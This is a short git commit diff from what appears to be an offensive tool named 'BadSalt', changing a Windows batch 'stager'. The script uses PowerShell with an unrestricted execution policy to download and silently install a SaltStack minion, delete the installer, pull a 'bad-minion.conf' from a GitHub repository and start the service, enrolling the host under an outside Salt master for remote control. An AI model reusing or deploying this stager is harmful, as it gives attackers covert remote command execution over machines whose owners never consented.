89eed85b96e7a71c0f6ba9a5c61cbff6b5f475a4
Injection <cerdmann@injecti0n.org>
2019-02-10 17:51:26 -0500

    macos stager and WIP windows stager

--- bad-minon-windows.bat
+++ bad-minon-windows.bat
@@ -1,5 +1,6 @@
 powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('https://repo.saltstack.com/windows/Salt-Minion-2018.3.3-Py2-AMD64-Setup.exe', 'C:\Windows\Temp\saltstack.exe')
 C:\Windows\Temp\saltstack.exe /S /master=salt
-powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('https://github.com/3ndG4me/BadSalt/blob/master/bad-minion.conf', 'C:\salt\conf\minion')
+del C:\Windows\Temp\saltstack.exe
+powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/3ndG4me/BadSalt/master/bad-minion.conf', 'C:\salt\conf\minion')
 sc start salt-minion
 
